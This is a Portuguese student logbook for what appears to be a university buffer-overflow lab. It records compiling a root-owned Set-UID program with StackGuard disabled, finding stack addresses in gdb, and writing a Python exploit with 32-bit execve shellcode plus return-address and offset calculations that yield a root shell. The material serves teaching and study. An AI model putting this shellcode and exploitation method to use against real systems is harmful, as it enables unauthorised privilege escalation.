# LOGBOOK5

## Task1
Nesta tarefa nós compilamos o código usando o MAKEFILE dado com o comando "make" e é criado 2 ficheiros executáveis, um de 32 bits e um de 64 bits.

Quando executo cada um dos ficheiros, é aberto um terminal novo no diretório onde foi executado o programa.


## Task2
Nesta tarefa, comecei por mudar o L1 do MAKEFILE para 140 de acordo com o número do nosso grupo conforme solicitado.

Depois desliguei a StackGuard, mudei o dono do programa para root, ativei o Set_UID e compilei o ficheiro stack usando o MAKEFILE.

Ao compilar, foram criados 2 ficheiros executáveis: "stack-L1" e o "stack-L1-dbg".

![task2_logbook5](img/task2_logbook5.png)


## Task3

O primeiro passo para explorarmos a vulnerabilidade é criar um ficheiro vazio chamado badfile e executar o programa vulnerável em modo de depuração. O objetivo é descobrirmos a posição do endereço de retorno da função bof() em relação ao início do buffer.

![task3_logbook51](img/depuracao_task3.png)

Depois de obtermos os endereços necessários, o próximo passo é inserir no ficheiro badfile o conteúdo que queremos colocar no buffer, usando o ficheiro exploit.py.

Na variável shellcode, adicionamos o shellcode em 32 bits.

``` bash
shellcode= (
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
 "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
 "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

``` 
Vamos usar o array de 517 bytes fornecido como tamanho do buffer.

``` bash
start = 517 - len(shellcode) 
```
Agora vamos usar a posição do buffer e o valor ebp descoberto anteriormente, para calcular o endereço de retorno e o offset.

``` bash
ret = 0xffffc9b4 + start
offset = 0xffffca48 - 0xffffc9b4 + 4
```

Por ultimo, intepretamos o ficheiro python para salvar as alterações e executamos o ficheiro stack-L1.

![task3_logbook52](img/tail_task3.png)

O programa vulnerável foi executado, resultando no buffer overflow que, conforme esperado, abriu uma shell com permissões de root.

## Questão 2

Depois de realizarmos o ataque da task3 com sucesso, usamos novamente o gbd, desta vez para ver como ficou o buffer após o ataque. Para isso usamos este comando gbd que mostra os 10000 bytes do buffer:
``` bash
x/10000c &buffer
```
Com isto, conseguimos encontrar o shellcode (que começa em 0x31 e termina em 0x80) e o respetivo return address (0xffffd03c).

![task3_logbook53](img/q2res_logbook5.png)